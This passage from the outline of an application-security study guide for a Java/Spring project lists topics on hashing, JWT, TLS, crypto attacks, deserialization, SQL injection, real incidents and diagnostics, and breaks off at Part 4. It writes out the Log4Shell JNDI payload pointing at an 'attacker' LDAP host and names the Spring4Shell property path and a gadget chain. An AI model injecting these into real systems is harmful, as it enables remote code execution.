3.6.3 Why bcrypt is only *time*-hard, not memory-hard (4 KB of state), and what that means for GPU
      and FPGA attacks. `[NUM]` `[PROVE]`
3.6.4 The 72-byte truncation, traced to the key-schedule loop — the mechanism, not just the fact.
      `[PROVE]` `[NUM]`
3.6.5 **Argon2** internals: the memory-filling pass over `m` KiB in `p` lanes for `t` passes, the
      Blake2b compression function, data-independent (`Argon2i`) vs data-dependent (`Argon2d`)
      indexing, and why **Argon2id** (hybrid) is the recommendation. `[NUM]` `[PROVE]`
3.6.6 The Argon2 parameter trade-off proven: doubling `m` at fixed `t` costs the attacker area×time
      linearly while costing you one memory allocation, which is why memory is the better knob.
      `[PROVE]` `[NUM]`
3.6.7 **scrypt** internals: `ROMix`/`BlockMix`/Salsa20/8 core, the `N`/`r`/`p` parameters, the
      memory requirement `128·N·r` bytes, and the TMTO (time-memory trade-off) an attacker can
      make. `[NUM]` `[PROVE]`
3.6.8 **PBKDF2** internals: `HMAC` iterated `c` times with XOR accumulation, the per-block
      structure, and why it is the weakest of the four (cheap on GPU, no memory hardness). `[NUM]`
      `[PROVE]`
3.6.9 The attacker's economics, worked with numbers: hashes/second/dollar for MD5, SHA-256, bcrypt
      cost 10/12/14, and Argon2id at 46 MiB — and the resulting time to exhaust an 8-character
      password space. This arithmetic is the whole argument. `[PROVE]` `[NUM]`
3.6.10 Calibrating a work factor against a real latency budget: verification latency × concurrent
       logins × CPU, and the DoS risk of setting it too high on the login endpoint. `[PROVE]`
       `[NUM]`
3.6.11 A **login-endpoint DoS via expensive hashing** as a real attack, and the fixes: rate limit
       before hashing, cap the password length, and consider a cheap pre-filter. `[ATTACK]`
       `[PROVE]`
3.6.12 The timing-attack surface in authentication, decomposed: user-existence timing, hash-compare
       timing, and the early-return paths. What is actually measurable over a network. `[PROVE]`

*(12 leaves)*

## §3.7 JOSE internals

3.7.1 The JWS signing-input construction and the exact byte sequence signed, with a worked example
      you can verify by hand. `[SPEC]` `[WIRE]` `[PROVE]`
3.7.2 Why the header being covered by the signature does **not** make `alg` trustworthy — the
      circularity: you need the algorithm to verify the signature that protects the algorithm.
      This is the proof behind "pin the algorithm". `[PROVE]`
3.7.3 The JWA algorithm registry: `HS256/384/512`, `RS256/384/512`, `ES256/384/512`, `PS256/384/512`,
      `EdDSA`, `none`; and the key-management `alg` values for JWE (`RSA-OAEP-256`, `A256KW`,
      `ECDH-ES+A256KW`, `dir`) with `enc` values (`A128CBC-HS256`, `A256GCM`). `[SPEC]` `[TABLE]`
      `[NUM]`
3.7.4 ECDSA's `r||s` fixed-width encoding in JWS versus DER in X.509, and the interoperability bugs
      that follow. `[SPEC]` `[NUM]`
3.7.5 The **ECDSA nonce-reuse catastrophe** (private-key recovery from two signatures with the same
      `k`) and why RFC 8725 § 3.2 recommends deterministic ECDSA (RFC 6979). `[PROVE]` `[SPEC]`
3.7.6 Invalid-curve attacks on ECDH-ES (RFC 8725 § 2.5 / § 3.4) and the point-validation
      requirement. `[SPEC]`
3.7.7 JWE's five-part structure decoded byte by byte, and the decrypt-then-verify-the-inner-signature
      ordering requirement. `[WIRE]` `[SPEC]`
3.7.8 JWK thumbprints (RFC 7638) and their two uses: as a `kid` and as DPoP's `jkt`. `[SPEC]`
      `[NUM]`
3.7.9 Nimbus internals as Spring Security uses them: `JWSVerificationKeySelector` pinning the
      algorithm set, `RemoteJWKSet` with its `ResourceRetriever` (connect/read timeout, size
      limit) and cache, `JWTClaimsSetVerifier`, and the rate-limited refresh on unknown `kid`.
      `[SOURCE]` `[API]` `[NUM]`
3.7.10 The JWKS-refresh amplification hazard: an attacker sending tokens with random `kid` values
       forcing repeated JWKS fetches. The rate limiter is the mitigation. `[ATTACK]` `[PROVE]`
3.7.11 `crit` header handling: an implementation must reject a token with a `crit` extension it does
       not understand — and libraries that ignore `crit` are a bypass. `[SPEC]` `[TRAP]`
3.7.12 Base64url decoding strictness: rejecting padding, rejecting non-canonical encodings, and the
       signature-bypass class where a permissive decoder accepts two encodings of the same bytes.
       `[PROVE]` `[RESEARCH]`

*(12 leaves)*

## §3.8 TLS and PKI internals

3.8.1 TLS 1.3's handshake message flow with the actual message names and extensions:
      `ClientHello` (`supported_versions`, `key_share`, `signature_algorithms`,
      `server_name`, `alpn`, `psk_key_exchange_modes`, `pre_shared_key`), `ServerHello`,
      `EncryptedExtensions`, `Certificate`, `CertificateVerify`, `Finished`, `NewSessionTicket`.
      `[SPEC]` `[WIRE]` `[FLOW]`
3.8.2 The **key schedule**: HKDF-Extract/Expand, the early/handshake/master secrets, and the
      derived traffic keys — enough to explain why the certificate is encrypted in 1.3 and not in
      1.2. `[SPEC]` `[PROVE]`
3.8.3 What `CertificateVerify` proves and why it is the actual server-authentication step. `[PROVE]`
3.8.4 The downgrade-protection sentinel in `ServerHello.random`, and why version negotiation moved
      to an extension. `[SPEC]` `[PROVE]`
3.8.5 TLS 1.2's `ClientKeyExchange`/RSA key transport versus ECDHE, and the reason RSA key transport
      was removed (no forward secrecy, Bleichenbacher). `[PROVE]`
3.8.6 The record layer, AEAD nonce construction per record, and the sequence number that prevents
      replay and reordering. `[SPEC]` `[PROVE]`
3.8.7 Path building (not just path validation): multiple chains, cross-signed roots, the
      AIA-fetching behaviour, and why a missing intermediate breaks some clients and not others.
      `[PROVE]` `[NUM]`
3.8.8 X.509 structure: `subject`, `issuer`, `serialNumber`, `notBefore`/`notAfter`,
      `subjectPublicKeyInfo`, and the extensions that matter — `subjectAltName`, `basicConstraints`,
      `keyUsage`, `extendedKeyUsage`, `authorityKeyIdentifier`, `crlDistributionPoints`,
      `authorityInfoAccess`, SCT list. `[SPEC]` `[TABLE]`
3.8.9 Name-constraint and pathlen enforcement, and why an unconstrained intermediate is a universal
      CA. `[PROVE]`
3.8.10 The JSSE implementation: `SSLContext` → `SSLEngine`/`SSLSocket`, `X509TrustManager`'s
       `checkServerTrusted`, `X509ExtendedTrustManager` and the **hostname verification** that only
       happens when the endpoint identification algorithm is set — the mechanism behind Java's
       classic "TLS without hostname checking" bug. `[SOURCE]` `[API]` `[PROVE]` `[TRAP]`
3.8.11 `jdk.tls.disabledAlgorithms`, `jdk.certpath.disabledAlgorithms`, `https.protocols`,
       `jdk.tls.client.protocols`, and `java.security` as the actual policy file. `[NUM]` `[API]`
3.8.12 Session resumption and TLS handshake cost in a JVM client: the `SSLSessionContext` cache,
       connection pooling, and why a new `HttpClient` per request is a security-adjacent performance
       bug. `[NUM]` `[X-REF 10]`
3.8.13 mTLS on the server side traced: `clientAuth=need|want`, the `Certificate` request, and how
       the certificate becomes an `Authentication` via `X509AuthenticationFilter` +
       `SubjectDnX509PrincipalExtractor`. `[SOURCE]` `[API]`

*(13 leaves)*

## §3.9 Crypto internals worth proving

3.9.1 **AES-GCM** internals: CTR mode for confidentiality plus GHASH over the ciphertext for
      authentication, the 96-bit IV + 32-bit counter layout, and the tag computation. `[NUM]`
      `[SPEC]`
3.9.2 **The proof that GCM nonce reuse is catastrophic**: two ciphertexts under the same key/nonce
      XOR to the XOR of plaintexts, *and* the pair leaks the GHASH subkey `H`, enabling forgery of
      arbitrary messages. Work it through. `[PROVE]` `[ATTACK]`
3.9.3 The birthday bound on random 96-bit nonces and where the 2^32-messages-per-key guidance comes
      from. `[PROVE]` `[NUM]`
3.9.4 **The padding-oracle attack**, worked byte by byte: how a distinguishable padding error
      recovers one plaintext byte at a time in 256 queries, and therefore why any decryption error
      must be indistinguishable. `[PROVE]` `[ATTACK]` `[NUM]`
3.9.5 **Encrypt-then-MAC vs MAC-then-encrypt vs encrypt-and-MAC**, and the proof that
      encrypt-then-MAC lets you reject before decrypting — which is what kills the oracle.
      `[PROVE]`
3.9.6 **HMAC's construction** (`H((K⊕opad) || H((K⊕ipad) || m))`) and why the nested structure
      resists length-extension, plus the length-extension attack on a naive `H(secret || message)`
      signature. `[PROVE]` `[ATTACK]`
3.9.7 **The CRIME/BREACH mechanism**: compression before encryption leaks plaintext through
      ciphertext length, and the adaptive-guessing loop that extracts a secret. This is the proof
      behind § 2.3.20 and behind Spring's XOR-masked CSRF token. `[PROVE]` `[ATTACK]`
3.9.8 `SecureRandom` internals: the `SecureRandomSpi`, `NativePRNG`/`NativePRNGBlocking`/
      `NativePRNGNonBlocking`/`DRBG`, the `securerandom.source` and
      `securerandom.strongAlgorithms` properties, seeding from the OS, and the container/VM
      early-boot entropy question. `[SOURCE]` `[API]` `[NUM]`
3.9.9 The proof that `java.util.Random` is predictable: a 48-bit LCG whose state is recoverable from
      two outputs — so a token generated with it is forgeable. `[PROVE]` `[NUM]` `[ATTACK]`
3.9.10 Entropy arithmetic for tokens: bits needed for a given population and collision probability
       (the birthday bound), and why 128 bits is the floor and 256 the comfortable choice.
       `[PROVE]` `[NUM]`
3.9.11 Why deterministic encryption leaks: identical plaintexts produce identical ciphertexts, so
       an encrypted column is a frequency-analysis target. The blind-index construction as the
       compromise. `[PROVE]`
3.9.12 Key-commitment and the AEAD "one ciphertext, two keys" subtlety, in one leaf, as the reason
       to prefer modern constructions. `[RESEARCH]`
3.9.13 Timing-attack feasibility over a network, honestly: the statistical requirements, why remote
       timing attacks are practical against large differences and impractical against
       nanosecond ones, and why you still write constant-time code. `[PROVE]`

*(13 leaves)*

## §3.10 Java deserialization internals

3.10.1 The serialization stream format: the magic `AC ED`, the version `00 05`, `TC_OBJECT`,
       `TC_CLASSDESC`, the `serialVersionUID`, field descriptors, and `TC_BLOCKDATA` — enough to
       recognise a payload in a log or a request body. `[WIRE]` `[NUM]`
3.10.2 What `readObject` actually invokes: no constructor, `readObject`/`readExternal`/`readResolve`
       on each class in the graph, and `validateObject`. **That is the code execution**, and it
       happens before your business logic sees anything. `[PROVE]` `[X-REF 03]`
3.10.3 The `hashCode`-triggered chain: a `HashMap` in the stream calls `hashCode()` on its keys
       during `readObject`, which is why so many gadget chains start with a map. `[PROVE]`
       `[ATTACK]`
3.10.4 A gadget chain traced end to end (Commons Collections `InvokerTransformer` +
       `ChainedTransformer` + `LazyMap` + `AnnotationInvocationHandler` → `Runtime.exec`), each
       link explained. `[ATTACK]` `[PROVE]` `[RESEARCH]`
3.10.5 The `TemplatesImpl` chain as the "no gadget library needed" variant, and why an allowlist
       beats a denylist here. `[ATTACK]`
3.10.6 The JEP 290 filter's invocation points inside `ObjectInputStream` — per class, per array
       length, per depth, per reference count, per byte count — and the fact that it runs *before*
       instantiation. `[SOURCE]` `[PROVE]`
3.10.7 The filter grammar parsed precisely, with worked pattern examples and the "last match does
       not win — first match decides" evaluation order. `[SPEC]` `[NUM]` `[SOURCE]`
3.10.8 The JEP 415 factory contract: invoked on every `ObjectInputStream` creation with
       `(currentFilter, requestedFilter)`, must be idempotent, and the "cannot be reset" rule.
       `[SPEC]` `[SOURCE]`
3.10.9 Why a filter is containment and not a fix: an allowlisted class can still be a gadget, and
       the limits (`maxdepth`, `maxarray`) only bound resource exhaustion. `[PROVE]`
3.10.10 **JNDI injection internals** (the Log4Shell primitive): `InitialContext.lookup` on an
        `ldap://` URL, the returned `javaClassName`/`javaCodebase`/`javaFactory` attributes, remote
        class loading, and the `com.sun.jndi.ldap.object.trustURLCodebase` /
        `trustSerialData` flags plus the JDK versions that changed their defaults. `[SPEC]`
        `[NUM]` `[PROVE]` `[RESEARCH]`
3.10.11 The `beanshell`/`el` local-gadget variants that made Log4Shell exploitable even with remote
        codebase loading disabled — the reason "we're on a patched JDK" was not a fix. `[PROVE]`
        `[RESEARCH]`
3.10.12 Records and sealed types as a deserialization-safety property: a record's canonical
        constructor runs on deserialization, so invariants hold — the one genuinely good news in
        this section. `[PROVE]` `[X-REF 04]`

*(12 leaves)*

## §3.11 SQL injection internals

3.11.1 The **extended query protocol** (PostgreSQL): `Parse` → `Bind` → `Execute`, with the parse
       producing a named prepared statement and `Bind` supplying parameter values as typed binary
       or text. The wire trace that proves data cannot become syntax. `[WIRE]` `[SPEC]` `[PROVE]`
3.11.2 The MySQL binary protocol equivalent (`COM_STMT_PREPARE` / `COM_STMT_EXECUTE`), and the
       crucial JDBC detail: **`useServerPrepStmts`** — when false, the driver does client-side
       substitution with escaping, which is safe but a *different* mechanism. Know which one you
       are getting. `[NUM]` `[PROVE]` `[RESEARCH]`
3.11.3 What client-side parameter substitution does (`ClientPreparedStatement`), why it is still
       safe (correct charset-aware escaping), and the historical charset bugs
       (`SET NAMES gbk` / `addslashes` multibyte) that make server-side preparation preferable.
       `[PROVE]` `[CVE]`
3.11.4 The plan cache as the *performance* reason people give for prepared statements, and why the
       security reason is independent of it. `[PROVE]` `[X-REF 09]`
3.11.5 Where Hibernate's parameters go: the generated SQL with `?`, `TypedParameterValue`, and
       what `@Query(nativeQuery=true)` with concatenation actually sends. `[SOURCE]` `[X-REF 08]`
3.11.6 Multi-statement execution: `allowMultiQueries` in MySQL JDBC as the flag that upgrades an
       injection from data theft to `DROP`, and the reason it must be off. `[NUM]` `[PROVE]`
3.11.7 Stored-procedure internals: `CALL` with bind parameters vs dynamic SQL inside the procedure
       (`EXECUTE IMMEDIATE`, `sp_executesql`), and why the injection just moved. `[PROVE]`
3.11.8 Database-side containment mechanics: `GRANT` minimalism, `SET ROLE`, PostgreSQL row-level
       security policies with `current_setting`, and read-only replicas for read paths. `[API]`
       `[X-REF 09]`
3.11.9 Detection at the database layer: `pg_stat_statements` normalisation revealing a query with
       an unexpected shape, and query-shape allowlisting as a real (if rare) control.
       `[X-REF 20]`

*(9 leaves)*

## §3.12 Real incidents, traced mechanically

3.12.1 **Log4Shell (CVE-2021-44228)** end to end: message-lookup substitution enabled by default,
       `${jndi:ldap://attacker/a}` in *any* logged value (a `User-Agent`, a username, a coupon
       code), `JndiLookup` → `InitialContext.lookup` → remote class load → RCE. Affected 2.0-beta9
       through 2.14.1 (with 2.15.0 incomplete), fixed in 2.16.0/2.17.0/2.17.1 and the 2.12.2/
       2.12.3/2.3.1 branches. Then CVE-2021-45046, CVE-2021-45105 (DoS) and CVE-2021-44832.
       `[CVE]` `[ATTACK]` `[NUM]` `[FLOW]` `[RESEARCH]`
3.12.2 Why Log4Shell is the canonical **supply-chain plus injection plus deserialization** lesson:
       a logging library was an interpreter, and nobody's threat model said so. `[PROVE]`
3.12.3 **Spring4Shell (CVE-2022-22965)** end to end: `WebDataBinder` binding request parameters to
       a POJO's nested properties, `class.module.classLoader.resources.context.parent.pipeline.
       first.*` reaching Tomcat's `AccessLogValve` to write a JSP, the Java 9+ precondition (the
       `Class.getModule()` addition), and the WAR-on-Tomcat precondition — a Boot executable jar is
       not exploitable. Fixed in 5.3.18/5.2.20. `[CVE]` `[ATTACK]` `[NUM]` `[PROVE]`
3.12.4 The general lesson from Spring4Shell: **framework autobinding is an object-graph write
       primitive**, which is the same idea as mass assignment at a much deeper level. `[PROVE]`
3.12.5 **Spring Cloud Function SpEL RCE (CVE-2022-22963)** and the `spring.cloud.function.routing-
       expression` header, as the SpEL-injection instance. `[CVE]` `[RESEARCH]`
3.12.6 **`jackson-databind` polymorphic-typing CVE family** as the illustration of why a denylist
       treadmill fails. `[CVE]`
3.12.7 **Heartbleed (CVE-2014-0160)** as the memory-disclosure lesson: a missing length check in a
       heartbeat response leaked 64 KB of process memory including private keys, and it was
       undetectable in logs. Why "rotate everything" was the only correct response. `[CVE]`
       `[NUM]` `[PROVE]`
3.12.8 **Equifax (2017)** as the patch-management lesson (Struts CVE-2017-5638, an OGNL expression
       in a `Content-Type` header), and the detection failure that extended it. `[CVE]`
3.12.9 **SolarWinds** as the build-system-compromise lesson, and the direct line to SLSA and
       provenance. `[CVE]`
3.12.10 **xz-utils (CVE-2024-3094)** as the maintainer-trust lesson, and what it says about the
        limits of SBOMs and scanners. `[CVE]` `[RESEARCH]`
3.12.11 **Okta / Uber / LastPass-class incidents** as the "MFA fatigue and support-desk social
        engineering" lesson, and the controls that address them. `[RESEARCH]`
3.12.12 **Optus / MOVEit / Capital One (SSRF → IMDS)** as three different shapes of the same story:
        an unauthenticated API, a file-transfer SQLi, and an SSRF into cloud metadata. `[CVE]`
        `[RESEARCH]`
3.12.13 How to *use* an incident in an interview: name it, state the mechanism in one sentence, name
        the control that would have stopped it, and name the control that would have detected it.
        `[PROVE]`

*(13 leaves)*

## §3.13 Proofs

3.13.1 Why SOP must block *reads* rather than *sends*, and what that costs. `[PROVE]`
3.13.2 Why CSRF is impossible without ambient credentials. `[PROVE]`
3.13.3 Why a synchronizer token works: the attacker cannot read a same-origin response. `[PROVE]`
3.13.4 Why double-submit is weaker than a synchronizer token, in terms of the related-domain
      attacker model. `[PROVE]`
3.13.5 Why XSS defeats every CSRF defence. `[PROVE]`
3.13.6 Why `HttpOnly` reduces but does not eliminate XSS impact. `[PROVE]`
3.13.7 Why CORS cannot protect a server. `[PROVE]`
3.13.8 Why `Access-Control-Allow-Origin: *` with credentials must be forbidden — construct the
      exploit if it were allowed. `[PROVE]`
3.13.9 Why prepared statements are categorically safe and escaping is not. `[PROVE]`
3.13.10 Why identifiers cannot be parameterized. `[PROVE]`
3.13.11 Why context-aware encoding requires five different encoders. `[PROVE]`
3.13.12 Why an allowlist HTML sanitizer must parse rather than pattern-match. `[PROVE]`
3.13.13 Why a nonce-based CSP is stronger than a host allowlist. `[PROVE]`
3.13.14 Why Trusted Types eliminates a bug class rather than mitigating it. `[PROVE]`
3.13.15 Why pinning the JWT algorithm is necessary — the verification circularity. `[PROVE]`
3.13.16 Why the `aud` claim is load-bearing, with the two-service exploit. `[PROVE]`
3.13.17 Why RS256→HS256 confusion works, arithmetically. `[PROVE]`
3.13.18 Why a stateless token cannot be revoked without state, and why the denylist is bounded.
        `[PROVE]`
3.13.19 Why refresh-token rotation with reuse detection converts theft into a detectable event.
        `[PROVE]`
3.13.20 Why PKCE stops code interception, and why `state` does not. `[PROVE]`
3.13.21 Why exact redirect-URI matching is required — enumerate the bypasses of every looser rule.
        `[PROVE]`
3.13.22 Why the mix-up attack needs the `iss` parameter and nothing weaker. `[PROVE]`
3.13.23 Why a 307 redirect after the login POST leaks credentials. `[PROVE]`
3.13.24 Why sender-constrained tokens are the only defence against token theft. `[PROVE]`
3.13.25 Why WebAuthn is phishing-resistant and TOTP is not — the origin-binding argument.
        `[PROVE]`
3.13.26 Why salting defeats rainbow tables but not targeted brute force. `[PROVE]`
3.13.27 Why memory hardness specifically defeats GPUs. `[PROVE]`
3.13.28 Why the work-factor calibration is an attacker-cost/user-latency optimisation, with the
        arithmetic. `[PROVE]`
3.13.29 Why a pepper helps only in the DB-only-leak scenario. `[PROVE]`
3.13.30 Why the dummy-hash-on-missing-user is required for enumeration resistance. `[PROVE]`
3.13.31 Why per-IP rate limiting fails against a distributed attack, with the arithmetic for 2.4M
        accounts. `[PROVE]` `[NUM]`
3.13.32 Why account lockout converts one attack into another. `[PROVE]`
3.13.33 Why GCM nonce reuse is catastrophic (from § 3.9.2). `[PROVE]`
3.13.34 Why a padding oracle decrypts without the key (from § 3.9.4). `[PROVE]`
3.13.35 Why `H(secret || message)` is forgeable and HMAC is not. `[PROVE]`
3.13.36 Why compression before encryption leaks (CRIME/BREACH), and therefore why Spring masks the
        CSRF token. `[PROVE]`
3.13.37 Why `java.util.Random` tokens are forgeable. `[PROVE]`
3.13.38 Why deterministic encryption leaks equality, and how a blind index bounds the leak.
        `[PROVE]`
3.13.39 Why envelope encryption makes key rotation cheap. `[PROVE]`
3.13.40 Why TLS gives you nothing about the client's identity. `[PROVE]`
3.13.41 Why hostname verification is a separate step from chain validation, and why omitting it
        voids TLS. `[PROVE]`
3.13.42 Why revocation does not work at internet scale, and short-lived certificates do. `[PROVE]`
3.13.43 Why deserializing untrusted data is RCE by construction. `[PROVE]`
3.13.44 Why a deserialization allowlist is containment and not a fix. `[PROVE]`
3.13.45 Why resolving DNS before validating is necessary but not sufficient (rebinding). `[PROVE]`
3.13.46 Why the object-level authorization check cannot be moved to the gateway. `[PROVE]`
3.13.47 Why authorization must be a live decision in QuizStakes — the self-exclusion argument
        against caching claims in a token. `[PROVE]` `[SOURCE]`
3.13.48 Why fail-open on the `ClientRestrictions` timeout is a breach and fail-closed is the only
        option. `[PROVE]` `[NUM]`
3.13.49 Why a `SecurityContext` that does not propagate to an executor fails *silently* and
        dangerously. `[PROVE]`
3.13.50 Why `@PostAuthorize` cannot prevent a side effect. `[PROVE]`
3.13.51 Why a proxy-based `@PreAuthorize` is bypassed by self-invocation. `[PROVE]`
3.13.52 Why the first-matching-`SecurityFilterChain` rule makes chain order a security decision.
        `[PROVE]`
3.13.53 Why path normalisation must precede authorization. `[PROVE]`
3.13.54 Why two HTTP parsers with different framing rules produce request smuggling. `[PROVE]`
3.13.55 Why an unkeyed input in a cache key produces poisoning. `[PROVE]`
3.13.56 Why a balance check followed by a debit is exploitable, and why a single conditional
        `UPDATE` is not. `[PROVE]`
3.13.57 Why a unique constraint is a better invariant than an application check. `[PROVE]`
3.13.58 Why an SBOM does not tell you whether you are exploitable, and reachability does. `[PROVE]`
3.13.59 Why dependency confusion works, and why an exclusive private repository fixes it.
        `[PROVE]`
3.13.60 Why signing artifacts is worthless without verification at deploy time. `[PROVE]`
3.13.61 Why "the network is trusted" is never a valid premise, expressed as a threat-model
        argument. `[PROVE]`
3.13.62 Why security through obscurity fails as a *primary* control but is not worthless as a
        *layer* — the honest version of Kerckhoffs. `[PROVE]`
3.13.63 Why defence in depth requires *independent* failure modes to be worth anything. `[PROVE]`
3.13.64 Why detection is not optional: the arithmetic of prevention coverage versus attack
        attempts. `[PROVE]`

*(64 leaves)*

## §3.14 The failure catalogue — symptom → cause → diagnostic → fix

3.14.1 "It works with Postman but the browser says CORS error." `[DIAG]`
3.14.2 "The preflight returns 401." `[DIAG]`
3.14.3 "Cookies are set but never sent back." (Domain, Path, `Secure` on http, `SameSite`, the
      4096-byte limit.) `[DIAG]`
3.14.4 "The session works locally and logs out in production." (Sticky sessions, multiple pods, no
      shared store, cookie domain.) `[DIAG]`
3.14.5 "My API returns a 302 to /login instead of a 401." (`ExceptionTranslationFilter` +
      `AuthenticationEntryPoint`.) `[DIAG]`
3.14.6 "403 Forbidden on every POST after upgrading Spring Boot." (CSRF.) `[DIAG]`
3.14.7 "CSRF token mismatch only in the SPA." (XOR handler, deferred token, cookie `HttpOnly`.)
      `[DIAG]`
3.14.8 "`@PreAuthorize` is ignored." (No `@EnableMethodSecurity`, self-invocation, non-public
      method, wrong proxy mode.) `[DIAG]`
3.14.9 "`hasRole('ROLE_ADMIN')` never matches." `[DIAG]`
3.14.10 "The JWT validates in one service and fails in another." (Clock skew, issuer, audience,
        `kid` not yet published, algorithm set.) `[DIAG]`
3.14.11 "Tokens started failing at 3am." (Key rotation without an overlap window; JWKS cache.)
        `[DIAG]`
3.14.12 "`invalid_grant` on the token exchange." (Code reuse, expired code, redirect-URI mismatch,
        PKCE verifier mismatch.) `[DIAG]`
3.14.13 "The OAuth login loops forever." (Cookie `SameSite` on the state cookie, session created
        after redirect, `sessionCreationPolicy(STATELESS)` with `oauth2Login`.) `[DIAG]`
3.14.14 "Login works but the user has no authorities." (Claim mapping, `SCOPE_` prefix,
        `GrantedAuthoritiesMapper`.) `[DIAG]`
3.14.15 "`PKIX path building failed`." (Missing intermediate, wrong truststore, self-signed cert.)
        `[DIAG]`
3.14.16 "`No subject alternative names present` / hostname mismatch." `[DIAG]`
        `[DIAG]`
3.14.17 "TLS works from curl and fails from the JVM." (`jdk.tls.disabledAlgorithms`, protocol
        version, SNI, truststore.) `[DIAG]`
3.14.18 "`javax.crypto.AEADBadTagException`." (Wrong key, wrong AAD, truncated ciphertext, nonce
        mismatch.) `[DIAG]`
3.14.19 "Decryption fails only for old rows." (Key rotation without a key id in the ciphertext.)
        `[DIAG]`
3.14.20 "`getInstanceStrong()` hangs in a container." (Entropy source.) `[DIAG]`
3.14.21 "Password verification suddenly fails for some users." (bcrypt 72-byte truncation, encoding
        change, `{id}` prefix mismatch, algorithm migration.) `[DIAG]`
3.14.22 "The CSP blocks my own inline script." (Nonce not propagated, cached HTML, framework
        injecting styles.) `[DIAG]`
3.14.23 "The page renders blank after adding COEP." (A subresource without CORP.) `[DIAG]`
3.14.24 "Our iframe embed broke." (`X-Frame-Options` default, `frame-ancestors`.) `[DIAG]`
3.14.25 "The scheduled job runs with no authentication." (`SecurityContext` propagation.) `[DIAG]`
3.14.26 "Rate limiting lets through 3× the limit." (Per-instance state.) `[DIAG]`
3.14.27 "The audit log shows the load balancer's IP for every event." (`X-Forwarded-For` /
        `ForwardedHeaderFilter`.) `[DIAG]`
3.14.28 "Authorization passes for a URL with a trailing slash." (Matcher normalisation.) `[DIAG]`
3.14.29 "`RequestRejectedException` for a legitimate URL." (`StrictHttpFirewall`.) `[DIAG]`
3.14.30 "An operator's CSV export executed a formula." `[DIAG]`
3.14.31 "The uploaded file is served as HTML." (`Content-Type`, `nosniff`, same-origin storage.)
        `[DIAG]`
3.14.32 "An SCA scan reports 300 criticals." (Triage procedure, reachability.) `[DIAG]`
3.14.33 "The dependency exists in Maven Central and in our Nexus with different contents."
        `[DIAG]`
3.14.34 "Secrets appear in the actuator env endpoint." `[DIAG]`
3.14.35 "A user reports seeing another user's data intermittently." (Cache key without tenancy,
        `ThreadLocal` leak, a shared mutable bean, `SecurityContext` reuse.) `[DIAG]`
        `[X-REF 05]`
3.14.36 "Deserialization filter rejects a legitimate class." `[DIAG]`
3.14.37 "The webhook signature verification fails for 1% of requests." (Body re-reading,
        whitespace, encoding, timestamp window, key rotation.) `[DIAG]`
3.14.38 "Everything is fine but the pentest report says `Missing security headers`." (What to
        actually fix and what to push back on.) `[DIAG]`

*(38 leaves)*

## §3.15 Observability of security controls

3.15.1 The security-relevant metrics to emit, with names: authentication attempts by outcome, MFA
      challenges, authorization denials by endpoint, rate-limit trips, token validation failures by
      reason, CSP violations, deserialization rejections, TLS handshake failures, `HttpFirewall`
      rejections, and secret-access counts. `[TABLE]` `[X-REF 20]`
3.15.2 Turning Spring Security's `ApplicationEvent`s into metrics and audit records with one
      listener. `[BUILD]` `[API]`
3.15.3 Micrometer counters/timers for the above, plus the cardinality trap of tagging by user id.
      `[API]` `[X-REF 20]`
3.15.4 Tracing an authentication and an authorization decision, and what to put in the span
      attributes without leaking. `[X-REF 20]`
3.15.5 Runtime inspection: reading the filter-chain startup log, `/actuator/mappings` for exposed
      endpoints, a thread dump during an auth stall, and heap-dump risk for secrets.
      `[DIAG]` `[X-REF 06]`
3.15.6 Verifying headers and TLS from the outside as a monitored check (a synthetic probe asserting
      HSTS, CSP and the certificate expiry). `[BUILD]`
3.15.7 Certificate-expiry and key-rotation alerting as the two operational alarms that prevent the
      most outages. `[NUM]`
3.15.8 The security dashboard that is worth building, and the three alerts that are worth paging
      for. `[PROVE]`

*(8 leaves)*

## §3.16 Version history and the migration surface

3.16.1 The browser platform timeline: SOP, CORS (2014), CSP 1.0/2/3, `SameSite` rollout and the
      Chrome default change, third-party-cookie phase-out, COOP/COEP after Spectre, Trusted Types,
      Fetch Metadata, and the retirement of `X-XSS-Protection`/HPKP/`Expect-CT`. `[TABLE]`
      `[VERSION-TRAP]`
3.16.2 The OAuth timeline: OAuth 1.0a → 2.0 (RFC 6749, 2012) → PKCE (2015) → the security-topics
      draft → mTLS/DPoP/PAR/JAR/RAR → **RFC 9700 (2025)** → **OAuth 2.1 draft**. What a
      2016-vintage integration looks like and what to change. `[TABLE]` `[VERSION-TRAP]`
3.16.3 The JWT timeline: RFC 7519 (2015), the 2015–2016 library CVE wave (`alg:none`, algorithm
      confusion), RFC 8725 (2020), RFC 9068 (2021). `[TABLE]`
3.16.4 The TLS timeline: SSL 3.0 → TLS 1.0/1.1 (deprecated by RFC 8996) → 1.2 → 1.3 (RFC 8446,
      2018); the CA ecosystem's move to short-lived certificates and automated issuance. `[TABLE]`
3.16.5 The password-guidance timeline: composition rules and 90-day rotation → NIST SP 800-63B
      (2017) inverting it → 800-63B-4; MD5 → SHA + salt → bcrypt → scrypt → Argon2 (PHC 2015).
      `[TABLE]`
3.16.6 The Java security timeline: the SecurityManager's deprecation for removal (JEP 411) and what
      replaced its (rarely justified) uses, JEP 290 (9), JEP 415 (17), TLS 1.3 in 11, `HttpClient`
      in 11, the JCE policy-file removal in 9, and the JDK's JNDI `trustURLCodebase` default
      changes. `[TABLE]` `[NUM]` `[VERSION-TRAP]`
3.16.7 The Spring Security timeline that matters for interviews: `WebSecurityConfigurerAdapter`
      deprecated (5.7) and removed (6.0), `antMatchers`→`requestMatchers`,
      `authorizeRequests`→`authorizeHttpRequests`, `AccessDecisionManager`→`AuthorizationManager`,
      `SecurityContextPersistenceFilter`→`SecurityContextHolderFilter` with explicit save, the CSRF
      BREACH/deferred changes, `PathPatternRequestMatcher` in 7.0, and the 7.0 feature set.
      `[TABLE]` `[VERSION-TRAP]` `[RESEARCH]`
3.16.8 The OWASP timeline: Top 10 2013 → 2017 → 2021 → **2025**; ASVS 3 → 4 → **5.0**; API Top 10
      2019 → 2023. Which document a given piece of received wisdom came from. `[TABLE]`
      `[VERSION-TRAP]`
3.16.9 How to answer a version question honestly: state the baseline you know, state what changed,
      and state how you would check. `[PROVE]`

*(9 leaves)*

**PART 3 total: 262 leaves.**

---

# PART 4 — BUILD IT

Every item is `[BUILD]`: complete, compiling Java 21 (or a complete runnable artifact where the
artifact is SQL/YAML/HTTP), against QuizStakes types, each followed by a **Diff vs the real one**
table naming what the production implementation adds and why.

## §4.1 Authentication and session primitives

4.1.1 A **secure session id generator and store** — 256-bit CSPRNG id, Redis-backed record with
      idle and absolute expiry, rotation on privilege change, and constant-time lookup. Diff vs
      Spring Session. `[BUILD]`
4.1.2 A **`PasswordEncoder` from scratch** wrapping Argon2id with the OWASP parameters, an encoded
